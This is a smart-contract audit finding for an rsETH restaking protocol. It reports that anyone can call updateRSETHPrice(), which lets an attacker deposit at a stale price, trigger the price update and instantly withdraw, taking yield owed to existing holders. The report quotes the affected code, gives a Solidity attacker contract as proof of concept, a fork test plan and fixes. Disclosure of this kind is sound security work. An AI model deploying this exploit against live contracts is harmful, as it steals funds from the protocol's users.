Audit Report

## Title
Permissionless `updateRSETHPrice()` Enables Sandwich Attack to Steal Accumulated Yield — (`File: contracts/LRTOracle.sol`)

## Summary

`LRTOracle.updateRSETHPrice()` is callable by any unprivileged address and writes a discrete jump to the cached `rsETHPrice` storage variable. Because `LRTDepositPool.depositETH` mints rsETH at the stale (lower) price and `LRTWithdrawalManager.instantWithdrawal` redeems at the live (higher) price, an attacker can atomically deposit, trigger the price update, and instantly withdraw — extracting all yield that accumulated since the last price update from existing rsETH holders.

## Finding Description

**Root cause:** `rsETHPrice` is a cached state variable updated only on explicit calls to `updateRSETHPrice()`, which carries no access restriction.

```solidity
// contracts/LRTOracle.sol L87-89
function updateRSETHPrice() public whenNotPaused {
    _updateRsETHPrice();
}
```

Between keeper calls, staking rewards accumulate inside EigenLayer strategies and LST rebases, so the real TVL grows while `rsETHPrice` remains frozen.

**Deposit minting** uses the stale price as the denominator:
```solidity
// contracts/LRTDepositPool.sol L520
rsethAmountToMint = (amount * lrtOracle.getAssetPrice(asset)) / lrtOracle.rsETHPrice();
```
A stale (lower) `rsETHPrice` causes the depositor to receive more rsETH than their fair share.

**Instant withdrawal** uses the live price as the numerator:
```solidity
// contracts/LRTWithdrawalManager.sol L593
underlyingToReceive = amount * lrtOracle.rsETHPrice() / lrtOracle.getAssetPrice(asset);
```
After `updateRSETHPrice()` raises the price, the same rsETH balance redeems for more underlying.

**Atomic exploit path (single transaction from attacker contract):**

1. Call `LRTDepositPool.depositETH{value: X}(0, "")` — receive `X / P_old` rsETH at stale price `P_old`.
2. Call `LRTOracle.updateRSETHPrice()` — price jumps to `P_new > P_old` reflecting accumulated rewards.
3. Call `LRTWithdrawalManager.instantWithdrawal(ETH_TOKEN, X/P_old, "")` — redeem `(X/P_old) * P_new` ETH.

**Gross profit** = `X * (P_new/P_old − 1)`, minus `instantWithdrawalFee`.

The three calls target three separate contracts (`LRTDepositPool`, `LRTOracle`, `LRTWithdrawalManager`), each with its own independent `ReentrancyGuardUpgradeable` storage slot. Sequential external calls from an attacker contract are not blocked by any of these per-contract guards.

**Why the `pricePercentageLimit` guard is insufficient:**

```solidity
// contracts/LRTOracle.sol L256-266
bool isPriceIncreaseOffLimit =
    pricePercentageLimit > 0 && priceDifference > pricePercentageLimit.mulWad(highestRsethPrice);
if (isPriceIncreaseOffLimit) {
    if (!IAccessControl(address(lrtConfig)).hasRole(LRTConstants.MANAGER, msg.sender)) {
        revert PriceAboveDailyThreshold();
    }
}
```

(a) If `pricePercentageLimit == 0` the check is skipped entirely. (b) Even when set, the attacker profits from any price increase that stays within the limit and can repeat the attack every accumulation cycle.

## Impact Explanation

**High — Theft of unclaimed yield.**

Each execution drains the yield accumulated since the last price update from all existing rsETH holders. With a sufficiently large deposit the attacker captures the entire pending reward increment in a single atomic transaction. Losses scale with TVL and the staleness window between keeper calls.

## Likelihood Explanation

`updateRSETHPrice()` is permissionless and the price is always stale between keeper calls. The only operational prerequisites are: `isInstantWithdrawalEnabled[ETH_TOKEN] == true`, `LRTUnstakingVault` holds sufficient ETH for instant redemption, and `maxFeeMintAmountPerDay > 0` (or `protocolFeeInBPS == 0`). All three conditions are expected to hold during normal protocol operation. The attack requires no privileged access, no oracle manipulation, and no external protocol compromise. It is repeatable every accumulation cycle.

## Recommendation

1. **Restrict `updateRSETHPrice()` to `onlyLRTManager`** so an attacker cannot atomically trigger the price jump themselves.
2. **Alternatively, apply a per-address deposit-then-instant-withdrawal lock** by recording the block number at deposit and rejecting `instantWithdrawal` in the same block for the same address.
3. **Enforce a non-zero `pricePercentageLimit` as a mandatory invariant** so that even if the public function remains, a single call cannot move the price by an economically meaningful amount.
4. **Consider a TWAP or time-weighted price** for minting and redemption rather than a point-in-time snapshot, eliminating the discrete jump that makes sandwiching profitable.

## Proof of Concept

```solidity
// Attacker contract — executes the full sandwich in one transaction
contract SandwichAttack {
    ILRTDepositPool  depositPool;
    ILRTOracle       oracle;
    ILRTWithdrawalManager withdrawalMgr;
    IRSETH           rsETH;

    function attack() external payable {
        // Step 1: deposit at stale (lower) rsETHPrice → receive inflated rsETH
        depositPool.depositETH{value: msg.value}(0, "");

        // Step 2: trigger the discrete price jump (permissionless)
        oracle.updateRSETHPrice();

        // Step 3: instant-withdraw at the new (higher) rsETHPrice
        uint256 rsETHBalance = rsETH.balanceOf(address(this));
        rsETH.approve(address(withdrawalMgr), rsETHBalance);
        withdrawalMgr.instantWithdrawal(LRTConstants.ETH_TOKEN, rsETHBalance, "");

        // Profit = received ETH − depositAmount − instantWithdrawalFee
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}
```

**Preconditions:** `isInstantWithdrawalEnabled[ETH_TOKEN] == true`; `LRTUnstakingVault` holds ≥ redeemed ETH; `pricePercentageLimit == 0` or accumulated rewards are within the limit; `maxFeeMintAmountPerDay > 0` or `protocolFeeInBPS == 0`.

**Foundry fork test plan:** Fork mainnet, deploy attacker contract, seed `LRTUnstakingVault` with ETH, advance time to accumulate rewards, call `attack()`, assert `address(attacker).balance > initial_deposit`.

**Affected lines:**
- `LRTOracle.updateRSETHPrice()` — `contracts/LRTOracle.sol` L87-89 [1](#0-0) 
- `LRTDepositPool.getRsETHAmountToMint()` — `contracts/LRTDepositPool.sol` L519-521 [2](#0-1) 
- `LRTWithdrawalManager.getExpectedAssetAmount()` — `contracts/LRTWithdrawalManager.sol` L592-594 [3](#0-2) 
- `LRTWithdrawalManager.instantWithdrawal()` — `contracts/LRTWithdrawalManager.sol` L212-253 [4](#0-3) 
- `LRTOracle._updateRsETHPrice()` price guard — `contracts/LRTOracle.sol` L252-266 [5](#0-4)

### Citations

**File:** contracts/LRTOracle.sol (L87-89)
```text
    function updateRSETHPrice() public whenNotPaused {
        _updateRsETHPrice();
    }
```

**File:** contracts/LRTOracle.sol (L252-266)
```text
        if (newRsETHPrice > highestRsethPrice) {
            // check if the price is above the threshold
            uint256 priceDifference = newRsETHPrice - highestRsethPrice;
            // pricePercentageLimit is in 1e18 precision (100% = 1e18, 1% = 1e16)
            bool isPriceIncreaseOffLimit =
                pricePercentageLimit > 0 && priceDifference > pricePercentageLimit.mulWad(highestRsethPrice);

            // check if the price difference is above the threshold
            if (isPriceIncreaseOffLimit) {
                // if sender has a manager role, this doesn't revert.
                // if not, it reverts as price went above the threshold
                if (!IAccessControl(address(lrtConfig)).hasRole(LRTConstants.MANAGER, msg.sender)) {
                    revert PriceAboveDailyThreshold();
                }
            }
```

**File:** contracts/LRTDepositPool.sol (L519-521)
```text
        // calculate rseth amount to mint based on asset amount and asset exchange rate
        rsethAmountToMint = (amount * lrtOracle.getAssetPrice(asset)) / lrtOracle.rsETHPrice();
    }
```

**File:** contracts/LRTWithdrawalManager.sol (L212-253)
```text
    function instantWithdrawal(
        address asset,
        uint256 rsETHUnstaked,
        string calldata referralId
    )
        external
        nonReentrant
        whenNotPaused
        onlySupportedAsset(asset)
        onlySupportedStrategy(asset)
        onlyInstantWithdrawalAllowed(asset)
    {
        if (rsETHUnstaked == 0 || rsETHUnstaked < minRsEthAmountToWithdraw[asset]) {
            revert InvalidAmountToWithdraw();
        }
        if (IERC20(lrtConfig.rsETH()).balanceOf(msg.sender) < rsETHUnstaked) revert NotEnoughRsETH();
        uint256 assetAmountUnlocked = getExpectedAssetAmount(asset, rsETHUnstaked);
        IRSETH(lrtConfig.rsETH()).burnFrom(address(msg.sender), rsETHUnstaked);
        ILRTUnstakingVault unstakingVault = ILRTUnstakingVault(lrtConfig.getContract(LRTConstants.LRT_UNSTAKING_VAULT));
        if (assetAmountUnlocked > unstakingVault.getAssetsAvailableForInstantWithdrawal(asset)) {
            revert CantInstantWithdrawMoreThanAvailable();
        }

        unstakingVault.redeem(asset, assetAmountUnlocked);

        uint256 fee = (assetAmountUnlocked * instantWithdrawalFee) / 10_000;
        uint256 userAmount = assetAmountUnlocked - fee;

        address feeRecipient = instantWithdrawalFeeRecipient;
        if (feeRecipient == address(0)) {
            // Backwards-compatible default: send fees to the protocol treasury
            feeRecipient = lrtConfig.getContract(LRTConstants.PROTOCOL_TREASURY);
        }
        if (fee > 0) {
            _transferAsset(asset, feeRecipient, fee);
            emit InstantWithdrawalFeeCollected(msg.sender, asset, fee);
        }

        _transferAsset(asset, msg.sender, userAmount);
        emit ReferralIdEmitted(referralId);
        emit AssetWithdrawalFinalized(msg.sender, asset, rsETHUnstaked, userAmount);
    }
```

**File:** contracts/LRTWithdrawalManager.sol (L592-594)
```text
        // calculate underlying asset amount to receive based on rsETH amount and asset exchange rate
        underlyingToReceive = amount * lrtOracle.rsETHPrice() / lrtOracle.getAssetPrice(asset);
    }
```
